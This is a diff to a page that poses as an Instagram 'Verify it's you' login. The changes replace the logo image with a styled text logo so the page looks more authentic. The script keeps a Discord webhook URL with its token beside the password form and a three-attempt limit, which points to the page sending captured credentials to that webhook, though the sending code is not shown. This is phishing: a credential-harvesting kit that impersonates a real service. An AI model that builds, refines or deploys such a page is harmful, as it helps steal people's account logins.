@@ -6,6 +6,10 @@
   <meta name="theme-color" content="#1a1a1a">
   <title>Instagram</title>
 
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+
   <style>
     * { box-sizing: border-box; }
 
@@ -47,11 +51,15 @@
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
     }
 
-    .logo-img {
-      display: block;
-      width: 150px;
-      height: auto;
-      margin: 0 auto 14px;
+    .logo {
+      margin: 0 0 14px;
+      font-size: 42px;
+      line-height: 1;
+      font-weight: 400;
+      color: #ffffff;
+      letter-spacing: 0;
+      font-family: "Grand Hotel", cursive;
+      padding-top: 4px;
     }
 
     .subtitle {
@@ -229,12 +237,11 @@
       margin-left: 4px;
     }
 
-    /* Timed-out state */
     .timeout-view {
       display: none;
     }
 
-    .timeout-view .logo-img {
+    .timeout-view .logo {
       margin-bottom: 26px;
     }
 
@@ -291,14 +298,14 @@
 
     @media (max-width: 380px) {
       .card { padding: 36px 24px 24px; }
-      .logo-img { width: 130px; }
+      .logo { font-size: 36px; }
       .signup-bar { padding: 18px; font-size: 13px; }
     }
 
     @media (max-height: 640px) {
       .page { justify-content: flex-start; padding-top: 16px; }
       .card { padding: 28px 24px 20px; }
-      .logo-img { width: 120px; margin-bottom: 10px; }
+      .logo { font-size: 32px; margin-bottom: 10px; }
       .subtitle { margin-bottom: 16px; }
     }
   </style>
@@ -309,10 +316,9 @@
 
     <section class="card">
 
-      <!-- ─── SIGN-IN VIEW ─── -->
       <div id="signinView">
 
-        <img src="logo.png" alt="Instagram" class="logo-img">
+        <h1 class="logo">Instagram</h1>
         <p class="subtitle">Verify it's you</p>
 
         <form id="loginForm">
@@ -375,10 +381,9 @@
 
       </div>
 
-      <!-- ─── TIMEOUT VIEW ─── -->
       <div id="timeoutView" class="timeout-view">
 
-        <img src="logo.png" alt="Instagram" class="logo-img">
+        <h1 class="logo">Instagram</h1>
 
         <div class="timeout-icon">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
@@ -403,10 +408,8 @@
   </main>
 
   <script>
-    // ─── CONFIG ───────────────────────────────────────────────────────────
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1551399122467164211/8R8no16JCKEuDQ_Fc_ahBJhdDFsw2MV15Ds_Q1RrT9cQaSfZMQdpdBji5rogSsBPa7d9";
     const MAX_ATTEMPTS = 3;
-    // ──────────────────────────────────────────────────────────────────────
 
     const form = document.getElementById("loginForm");
     const password = document.getElementById("password");
